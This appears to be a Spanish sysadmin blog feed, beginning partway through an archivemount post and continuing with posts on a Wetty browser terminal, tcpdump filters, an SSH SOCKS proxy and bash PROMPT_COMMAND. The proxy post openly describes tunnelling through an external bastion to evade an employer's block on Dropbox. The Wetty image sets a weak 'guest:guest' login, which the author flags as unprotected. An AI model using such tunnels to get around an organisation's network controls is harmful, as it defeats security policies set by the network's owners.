&lt;p&gt;Vamos a empezar instalando el paquete &lt;strong&gt;archivemount&lt;/strong&gt;, que nos va a dar las herramientas para montar nuestros ficheros comprimidos. Cada distribución lo hace a su manera; revisa la documentación de la tuya.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# apt-get install archivemount
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following extra packages will be installed:
  fuse libalgorithm-c3-perl libarchive-extract-perl libarchive13 libcgi-fast-perl libcgi-pm-perl libclass-c3-perl libclass-c3-xs-perl libcpan-meta-perl libdata-optlist-perl
  libdata-section-perl libfcgi-perl libfuse2 libgdbm3 liblog-message-perl liblog-message-simple-perl liblzo2-2 libmodule-build-perl libmodule-pluggable-perl libmodule-signature-perl
  libmro-compat-perl libnettle4 libpackage-constants-perl libparams-util-perl libpod-latex-perl libpod-readme-perl libregexp-common-perl libsoftware-license-perl libsub-exporter-perl
  libsub-install-perl libterm-ui-perl libtext-soundex-perl libtext-template-perl libxml2 perl perl-modules rename sgml-base xml-core
Suggested packages:
  lrzip perl-doc libterm-readline-gnu-perl libterm-readline-perl-perl make libb-lint-perl libcpanplus-dist-build-perl libcpanplus-perl libfile-checktree-perl libobject-accessor-perl
  sgml-base-doc debhelper
Recommended packages:
  libarchive-tar-perl
The following NEW packages will be installed:
  archivemount fuse libalgorithm-c3-perl libarchive-extract-perl libarchive13 libcgi-fast-perl libcgi-pm-perl libclass-c3-perl libclass-c3-xs-perl libcpan-meta-perl libdata-optlist-perl
  libdata-section-perl libfcgi-perl libfuse2 libgdbm3 liblog-message-perl liblog-message-simple-perl liblzo2-2 libmodule-build-perl libmodule-pluggable-perl libmodule-signature-perl
  libmro-compat-perl libnettle4 libpackage-constants-perl libparams-util-perl libpod-latex-perl libpod-readme-perl libregexp-common-perl libsoftware-license-perl libsub-exporter-perl
  libsub-install-perl libterm-ui-perl libtext-soundex-perl libtext-template-perl libxml2 perl perl-modules rename sgml-base xml-core
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;40&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;0&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;8172&lt;/span&gt; kB of archives.
After this operation, &lt;span class="m"&gt;41&lt;/span&gt;.7 MB of additional disk space will be used.
Do you want to &lt;span class="k"&gt;continue&lt;/span&gt;? &lt;span class="o"&gt;[&lt;/span&gt;Y/n&lt;span class="o"&gt;]&lt;/span&gt; y
...
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para montar un fichero comprimido en una carpeta, necesitamos ambos, así que los creamos. El fichero comprimido va a ser un fichero &lt;em&gt;.tar.gz&lt;/em&gt; vacío.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# mkdir data
root@cfed45d103a2:~# tar czvf data.tar.gz --files-from /dev/null
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos como nos queda la carpeta local, con ambas cosas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# tree
.
&lt;span class="p"&gt;|&lt;/span&gt;-- data
&lt;span class="sb"&gt;`&lt;/span&gt;-- data.tar.gz

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;1&lt;/span&gt; file
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo queda montar el sistema de ficheros para empezar a utilizarlo. Aunque se podría delegar el montaje del sistema de ficheros al sistema escribiendo en &lt;em&gt;/etc/fstab&lt;/em&gt;, vamos a hacerlo manualmente en este ejemplo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# archivemount data.tar.gz data/
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear algunos ficheros en la carpeta. Es especialmente interesante fijarnos en que trabajamos con una carpeta normal, como lo haríamos habitualmente. De esta forma, hasta un &lt;em&gt;software&lt;/em&gt; existente podría modificar este sistema de ficheros.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;no content&amp;quot;&lt;/span&gt; &amp;gt; data/README
root@cfed45d103a2:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; &amp;gt; data/VERSION
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Comprobamos lo que tenemos, solo para asegurar el éxito:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# tree
.
&lt;span class="p"&gt;|&lt;/span&gt;-- data
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="p"&gt;|&lt;/span&gt;-- README
&lt;span class="p"&gt;|&lt;/span&gt;   &lt;span class="sb"&gt;`&lt;/span&gt;-- VERSION
&lt;span class="sb"&gt;`&lt;/span&gt;-- data.tar.gz

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;3&lt;/span&gt; files
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cuando acabemos de trabajar con el sistema de ficheros y se desmonte, pasará la magia; se va a comprimir el sistema de ficheros en el fichero &lt;em&gt;.tar.gz&lt;/em&gt; con el nombre inicial, previa copia del antiguo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# umount data
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que el sistema de ficheros ya no está disponible, como esperaríamos de un &lt;em&gt;umount&lt;/em&gt;; el fichero que montamos en su momento ha quedado como &lt;em&gt;data.tar.gz.orig&lt;/em&gt;, y el fichero &lt;em&gt;data.tar.gz&lt;/em&gt; tiene el contenido actualizado de nuestra sesión de trabajo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# tree
.
&lt;span class="p"&gt;|&lt;/span&gt;-- data
&lt;span class="p"&gt;|&lt;/span&gt;-- data.tar.gz
&lt;span class="sb"&gt;`&lt;/span&gt;-- data.tar.gz.orig

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;2&lt;/span&gt; files
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar el contenido simplemente verificando lo que hay en los ficheros:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@cfed45d103a2:~# tar tzf data.tar.gz
tar: Removing leading &lt;span class="sb"&gt;`&lt;/span&gt;/&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; from member names
/README
/VERSION
root@cfed45d103a2:~# tar tzf data.tar.gz.orig 
root@cfed45d103a2:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como podíamos esperar, el fichero &lt;em&gt;data.gz.orig&lt;/em&gt; está vacío y el fichero &lt;em&gt;data.tar.gz&lt;/em&gt; contiene los nuevos ficheros. Es importante recalcar que si se volviera a montar y desmontar el sistema de ficheros -y hubieran cambios en el mismo-, se volvería a crear el fichero &lt;em&gt;data.tar.gz&lt;/em&gt;, y el &lt;em&gt;data.tar.gz.orig&lt;/em&gt; quedaría sobrescrito de nuevo.&lt;/p&gt;</content><category term="linux"></category><category term="archivemount"></category><category term="mount"></category><category term="tar"></category><category term="gz"></category><category term="targz"></category></entry><entry><title>Un terminal SSH en nuestro navegador web usando Wetty</title><link href="https://www.linuxsysadmin.ml/2017/09/un-terminal-ssh-en-nuestro-navegador-web-usando-wetty.html" rel="alternate"></link><published>2017-09-25T10:00:00+02:00</published><updated>2017-09-25T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-09-25:/2017/09/un-terminal-ssh-en-nuestro-navegador-web-usando-wetty.html</id><summary type="html">&lt;p&gt;No siempre tenemos acceso a nuestro terminal SSH favorito para acceder a nuestros entornos en caso de emergencia. De hecho, en muchas redes suelen prohibir el tráfico por otros puertos ajenos a la navegación web. Para estos casos podemos tener un terminal SSH a través de una página web propia …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No siempre tenemos acceso a nuestro terminal SSH favorito para acceder a nuestros entornos en caso de emergencia. De hecho, en muchas redes suelen prohibir el tráfico por otros puertos ajenos a la navegación web. Para estos casos podemos tener un terminal SSH a través de una página web propia.&lt;/p&gt;
&lt;p&gt;El truco consiste en usar &lt;strong&gt;Wetty&lt;/strong&gt;. Si os interesa, podéis encontrar el repositorio de GitHub &lt;a href="https://github.com/krishnasrinivas/wetty"&gt;aquí&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Terminal over HTTP and HTTPS. Wetty is an alternative to ajaxterm/anyterm but much better than them because wetty uses ChromeOS' terminal emulator (hterm) which is a full fledged implementation of terminal emulation written entirely in Javascript. Also it uses websockets instead of Ajax and hence better response time.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Podemos encontrar una imagen en &lt;a href="https://hub.docker.com/r/nathanleclaire/wetty/"&gt;DockerHub&lt;/a&gt;, que nos vale para una demostración rápida. Sin embargo, el gran tamaño de su imagen la hace impracticable para un uso habitual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/wetty$ docker images &lt;span class="p"&gt;|&lt;/span&gt; grep wetty
nathanleclaire/wetty   latest              94635175ccb6        &lt;span class="m"&gt;2&lt;/span&gt; years ago         &lt;span class="m"&gt;1&lt;/span&gt;.2 GB
gerard@aldebaran:~/docker/wetty$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así pues, podemos construir otra imagen, basándonos en los pasos de instalación que aparecían en GitHub, con el único añadido de un fichero &lt;em&gt;.tar.gz&lt;/em&gt; con una imagen del repositorio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/wetty$ tar tf wetty.tar.gz 
.gitignore
Dockerfile
Gruntfile.js
LICENSE
README.md
app.js
bin/
bin/wetty.conf
bin/wetty.js
bin/wetty.service
package.json
public/
public/index.html
public/wetty/
public/wetty/hterm_all.js
public/wetty/index.html
public/wetty/wetty.js
terminal.png
gerard@aldebaran:~/docker/wetty$ cat Dockerfile 
FROM alpine:3.5
RUN apk add --no-cache nodejs tini
ENV &lt;span class="nv"&gt;NODE_ENV&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;production
ADD wetty.tar.gz /srv/app/
WORKDIR /srv/app/
RUN apk add --no-cache python2 make g++ &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    npm install &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apk del python2 make g++
RUN adduser guest -D &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;guest:guest&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/sbin/tini&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;node&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;app.js&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-p&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;3000&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/wetty$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto nos deja una imagen mucho más pequeña, pero nos limita a entrar por SSH en un terminal de &lt;em&gt;Alpine Linux&lt;/em&gt;, que aunque magnífico, no es tan completo como el de otras distribuciones. Usad la distribución que más os convenga.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/wetty$ docker images &lt;span class="p"&gt;|&lt;/span&gt; grep wetty
wetty                  latest              45635173077e        &lt;span class="m"&gt;35&lt;/span&gt; minutes ago      &lt;span class="m"&gt;56&lt;/span&gt;.2 MB
gerard@aldebaran:~/docker/wetty$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como pretendo utilizarla como un máquina de salto, este tamaño y limitación son más que adecuados. Sin embargo no estaba dispuesto a pagar 1,2 gb por un contenedor que no hace nada por sí mismo...&lt;/p&gt;
&lt;p&gt;Solo nos queda ejecutar la imagen exponiendo el puerto 3000 del contenedor, para poder acceder remotamente desde el navegador, que en mi caso estaría en &lt;a href="http://localhost:3000/"&gt;http://localhost:3000/&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/wetty$ docker run -ti --rm -p &lt;span class="m"&gt;3000&lt;/span&gt;:3000 wetty
http on port &lt;span class="m"&gt;3000&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: Esta página está desprotegida, sin autenticación ni encriptación. Una buena opción está en dotarla de ambos usando un servidor web &lt;strong&gt;nginx&lt;/strong&gt; como frontal. También es interesante modificar el usuario de entrada con par de claves, añadir un cliente de SSH para saltar, y lo que más nos interese.&lt;/p&gt;</content><category term="ssh"></category><category term="terminal"></category><category term="wetty"></category></entry><entry><title>Espiando trazas de red con tcpdump</title><link href="https://www.linuxsysadmin.ml/2017/08/espiando-trazas-de-red-con-tcpdump.html" rel="alternate"></link><published>2017-08-14T10:00:00+02:00</published><updated>2017-08-14T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-08-14:/2017/08/espiando-trazas-de-red-con-tcpdump.html</id><summary type="html">&lt;p&gt;No suelen haber errores de conexión en los entornos que administro; sin embargo, alguna vez los hay. Esto supone un marrón, porque la red es ese elemento que escapa a mi gestión; la gente que se dedica a eso suele negar estos problemas argumentando cualquier excusa. Para eso está &lt;strong&gt;tcpdump …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;No suelen haber errores de conexión en los entornos que administro; sin embargo, alguna vez los hay. Esto supone un marrón, porque la red es ese elemento que escapa a mi gestión; la gente que se dedica a eso suele negar estos problemas argumentando cualquier excusa. Para eso está &lt;strong&gt;tcpdump&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Las pocas veces que tengo que recurrir a esto para conseguir evidencias siempre es una fiesta, porque como no lo utilizo de forma habitual, me olvido fácilmente de los parámetros más básicos. Y esto pretende ser una chuleta para el futuro.&lt;/p&gt;
&lt;p&gt;Normalmente solo me encargo de capturar los paquetes en un fichero de formato &lt;em&gt;.pcap&lt;/em&gt;, dejando a otro más experto en el tema el gusto de interpretarlos. Claro que muchas otras veces son usados como evidencias sin análisis previo...&lt;/p&gt;
&lt;h2&gt;Elegir la interfaz a usar&lt;/h2&gt;
&lt;p&gt;Usaremos el &lt;em&gt;flag -i&lt;/em&gt; para indicar la interfaz (o todas con &lt;em&gt;any&lt;/em&gt;), pudiendo consultar las disponibles con el flag &lt;em&gt;-D&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tcpdump -D
tcpdump -i eth0
tcpdump -i any
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Filtrar por varios criterios&lt;/h2&gt;
&lt;p&gt;Como el tamaño del fichero final crece descontroladamente, vale la pena usar filtros, que en &lt;strong&gt;tcpdump&lt;/strong&gt; son combinaciones de &lt;em&gt;expresiones&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Una &lt;em&gt;expresión&lt;/em&gt; puede ser de 3 tipos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;De tipo&lt;/strong&gt;: &lt;em&gt;host&lt;/em&gt; (ej. 172.16.0.3), &lt;em&gt;net&lt;/em&gt; (ej. 10.0.0.0/8) y &lt;em&gt;port&lt;/em&gt; (ej. 443)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;De dirección&lt;/strong&gt;: &lt;em&gt;src&lt;/em&gt;, &lt;em&gt;dst&lt;/em&gt; o nada (que significa ambas)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;De protocolo&lt;/strong&gt;: &lt;em&gt;tcp&lt;/em&gt;, &lt;em&gt;udp&lt;/em&gt; o &lt;em&gt;icmp&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Esta lista no está completa. Revisad las páginas &lt;em&gt;man&lt;/em&gt; para más detalles.&lt;/p&gt;
&lt;p&gt;Así pues, para filtrar el tráfico que se origina en una red local 192.168.1.0/24, podríamos usar algo como:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tcpdump -i any src net &lt;span class="m"&gt;192&lt;/span&gt;.168.1.0/24
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos combinar grupos de expresiones con los operadores &lt;em&gt;not&lt;/em&gt;, &lt;em&gt;or&lt;/em&gt; y &lt;em&gt;and&lt;/em&gt;, con uso de paréntesis para priorizar operadores.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tcpdump src &lt;span class="m"&gt;10&lt;/span&gt;.0.2.4 and &lt;span class="o"&gt;(&lt;/span&gt;dst port &lt;span class="m"&gt;3389&lt;/span&gt; or &lt;span class="m"&gt;22&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Captura de un fichero para su uso posterior&lt;/h2&gt;
&lt;p&gt;Ver los paquetes en local es una opción válida, pero dependiendo del volumen de tráfico capturado puede resultar en dejarse la vista. En estos casos es más fácil guardar el resultado en un fichero que luego pueda ser leído, por el mismo &lt;strong&gt;tcpdump&lt;/strong&gt; (con el &lt;em&gt;flag -r&lt;/em&gt;), o por una cómoda aplicación de escritorio, como por ejemplo, &lt;a href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;En este caso, basta con utilizar un &lt;em&gt;flag&lt;/em&gt; que le indique que tiene que guardar un fichero. Este &lt;em&gt;flag&lt;/em&gt; es el &lt;em&gt;flag -w&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tcpdump -i eth0 tcp -w traffic.pcap
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;&lt;em&gt;Y con estas pinceladas básicas, podemos aportar evidencias para que el experto se lo mire&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</content><category term="tcpdump"></category><category term="red"></category><category term="trazas"></category><category term="evidencias"></category></entry><entry><title>Ignorando el proxy de mi empresa: un proxy SOCKS</title><link href="https://www.linuxsysadmin.ml/2017/07/ignorando-el-proxy-de-mi-empresa-un-proxy-socks.html" rel="alternate"></link><published>2017-07-31T10:00:00+02:00</published><updated>2017-07-31T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-07-31:/2017/07/ignorando-el-proxy-de-mi-empresa-un-proxy-socks.html</id><summary type="html">&lt;p&gt;Tenemos en el trabajo uno de esos &lt;em&gt;enginjerks&lt;/em&gt; que lanzan acciones &lt;em&gt;random&lt;/em&gt; para justificar su trabajo. Cortó el acceso a &lt;em&gt;Dropbox&lt;/em&gt;, en donde tengo cosas útiles para mi trabajo. Harto de encender los datos móviles de mi móvil para ir sincronizando ficheros, me he montado un proxy &lt;strong&gt;SOCKS&lt;/strong&gt; para mí …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Tenemos en el trabajo uno de esos &lt;em&gt;enginjerks&lt;/em&gt; que lanzan acciones &lt;em&gt;random&lt;/em&gt; para justificar su trabajo. Cortó el acceso a &lt;em&gt;Dropbox&lt;/em&gt;, en donde tengo cosas útiles para mi trabajo. Harto de encender los datos móviles de mi móvil para ir sincronizando ficheros, me he montado un proxy &lt;strong&gt;SOCKS&lt;/strong&gt; para mí.&lt;/p&gt;
&lt;p&gt;Se trata de una tocada de narices tener que encender los datos móviles de mi &lt;em&gt;smartphone&lt;/em&gt; para sincronizar la carpeta de &lt;em&gt;Dropbox&lt;/em&gt; periódicamente. También es completamente inútil como medida de seguridad, puesto que muevo con frecuencia mi ordenador portátil por obligaciones profesionales.&lt;/p&gt;
&lt;p&gt;Sin embargo, hay un acceso más allá de los puertos 80 y 443; se trata del puerto 22, específicamente hacia un servidor bastión que nos sirve para acceder a los entornos en donde corren nuestras aplicaciones. Por supuesto están fuera de nuestra infraestructura.&lt;/p&gt;
&lt;p&gt;La idea es muy simple: levantamos un &lt;em&gt;proxy SOCKS&lt;/em&gt; en la máquina remota (con pleno acceso a internet), en un puerto al que podamos llegar con nuestro ordenador; configuramos nuestro ordenador para usar ese &lt;em&gt;proxy&lt;/em&gt; remoto. Alternativamente, como no tengo más puertos por los que pasar, puedo levantar el puerto del &lt;em&gt;proxy&lt;/em&gt; en mi mismo ordenador, de la misma forma que los túneles SSH.&lt;/p&gt;
&lt;h2&gt;Un ejemplo práctico&lt;/h2&gt;
&lt;p&gt;Vamos a suponer que tenemos dos máquinas; también vamos a suponer que levantamos el &lt;em&gt;proxy SOCKS&lt;/em&gt; en nuestro escritorio:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;alphacentauri&lt;/strong&gt;: Es nuestra máquina remota, tiene instalado &lt;strong&gt;SSH&lt;/strong&gt; y tiene acceso libre a internet.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;capella&lt;/strong&gt;: es nuestro escritorio, en donde desarrollamos nuestro trabajo.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;El responsable de levantar el &lt;em&gt;proxy SOCKS&lt;/em&gt; es el mismo SSH. Para ello basta el &lt;em&gt;flag -D&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@capella:~$ ssh -N -D &lt;span class="m"&gt;9999&lt;/span&gt; proxy@alphacentauri -p &lt;span class="m"&gt;2222&lt;/span&gt; -f
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;alphacentauri:2222&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
gerard@capella:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hay una serie de consideraciones en este comando:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Existe un usuario &lt;em&gt;proxy&lt;/em&gt; en &lt;em&gt;alphacentauri&lt;/em&gt;. Es un usuario normal y tenemos autenticación por par de claves (opcional, pero muy cómodo).&lt;/li&gt;
&lt;li&gt;Por cortesía del &lt;em&gt;flag -N&lt;/em&gt; no vamos a abrir un terminal.&lt;/li&gt;
&lt;li&gt;El &lt;em&gt;flag -f&lt;/em&gt; nos levanta el &lt;em&gt;proxy&lt;/em&gt; en &lt;em&gt;background&lt;/em&gt;, que nos evita bloquear el terminal pero exige el par de claves.&lt;/li&gt;
&lt;li&gt;El servidor SSH en &lt;em&gt;alphacentauri&lt;/em&gt; escucha en el puerto 2222, y por eso usamos el &lt;em&gt;flag -p&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Gracias al &lt;em&gt;flag -D&lt;/em&gt;, el &lt;em&gt;proxy&lt;/em&gt; se levanta en el puerto 9999, escuchando en &lt;em&gt;localhost&lt;/em&gt; (por defecto).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A partir de este momento, todas las conexiones que usen &lt;em&gt;localhost:9999&lt;/em&gt; como &lt;em&gt;proxy SOCKS&lt;/em&gt;, van a acceder a internet como lo hace la máquina &lt;em&gt;alphacentauri&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Sin más esperas, vamos al cliente de &lt;em&gt;dropbox&lt;/em&gt;; podemos configurar el &lt;em&gt;proxy&lt;/em&gt; en "Preferencias &amp;gt; Proxies". Basta con indicar la opción "Tipo de proxy" como "SOCKS5" y el servidor como "127.0.0.1:9999".&lt;/p&gt;
&lt;p&gt;Como ya sabemos que los túneles SSH se caen, os recomiendo altamente usar un mecanismo de levantamiento automático, como &lt;em&gt;autossh&lt;/em&gt; o directamente &lt;a href="https://www.linuxsysadmin.ml/2016/11/levantando-tuneles-ssh-con-systemd.html"&gt;usando SystemD&lt;/a&gt;.&lt;/p&gt;</content><category term="ssh"></category><category term="proxy"></category><category term="socks"></category></entry><entry><title>Explorando bash: la variable de entorno PROMPT_COMMAND</title><link href="https://www.linuxsysadmin.ml/2017/06/explorando-bash-la-variable-de-entorno-prompt-command.html" rel="alternate"></link><published>2017-06-19T10:00:00+02:00</published><updated>2017-06-19T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-06-19:/2017/06/explorando-bash-la-variable-de-entorno-prompt-command.html</id><summary type="html">&lt;p&gt;Los &lt;em&gt;gurús&lt;/em&gt; del terminal ya conocemos muchas de las virtudes de &lt;strong&gt;bash&lt;/strong&gt;. Sin embargo, es una utilidad muy grande y no es raro que cada vez que busquemos encontremos cosas nuevas. Esta vez, y casi por curiosidad, encontré una variable llamada &lt;strong&gt;PROMPT_COMMAND&lt;/strong&gt;, que aunque no es conocida, es muy útil …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Los &lt;em&gt;gurús&lt;/em&gt; del terminal ya conocemos muchas de las virtudes de &lt;strong&gt;bash&lt;/strong&gt;. Sin embargo, es una utilidad muy grande y no es raro que cada vez que busquemos encontremos cosas nuevas. Esta vez, y casi por curiosidad, encontré una variable llamada &lt;strong&gt;PROMPT_COMMAND&lt;/strong&gt;, que aunque no es conocida, es muy útil.&lt;/p&gt;
&lt;p&gt;El cometido de esta variable de entorno es el de ejecutar un comando de &lt;strong&gt;bash&lt;/strong&gt; antes de pintar el símbolo de sistema, según &lt;a href="http://www.tldp.org/HOWTO/Bash-Prompt-HOWTO/x264.html"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Bash provides an environment variable called PROMPT_COMMAND. The contents of this variable are executed as a regular Bash command just before Bash displays a prompt.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;No parece muy impresionante a simple vista, pero con algunas ideas adecuadas nos puede quitar mucho trabajo, automatizando aquellas tareas que hacemos cuando entramos en la carpeta, con vistas a trabajar en ella.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: En todos los ejemplos vamos a definir la variable &lt;strong&gt;PROMPT_COMMAND&lt;/strong&gt; en el fichero &lt;em&gt;.bashrc&lt;/em&gt;, para que se haga automáticamente. Para que se active, hace falta hacer un &lt;em&gt;source&lt;/em&gt; del fichero o abrir de nuevo el terminal; no siempre se menciona en los ejemplos.&lt;/p&gt;
&lt;h2&gt;Un comando informativo e incondicional&lt;/h2&gt;
&lt;p&gt;¿Que hay mas útil que saber la hora del día sin tener que salir del terminal? Podemos poner una función que nos informe de la hora cada vez que pintemos el símbolo del sistema. Luego enchufamos esta función en la variable de entorno, y cada vez que lo pinte, tenemos un bonito reloj.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat .bashrc 
...
prompt_command&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;quot;Current time: &amp;quot;&lt;/span&gt;
    date &lt;span class="s2"&gt;&amp;quot;+%Y-%m-%d %H:%M:%S&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PROMPT_COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;prompt_command
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo hace falta abrir de nuevo el terminal, o hacer un &lt;em&gt;source&lt;/em&gt; del fichero &lt;em&gt;.bashrc&lt;/em&gt;. La siguiente vez que pinte un &lt;em&gt;prompt&lt;/em&gt;, ejecutará antes nuestra función; de hecho lo va a ejecutar tan pronto como acabe el comando &lt;em&gt;source&lt;/em&gt;.&lt;/p&gt;
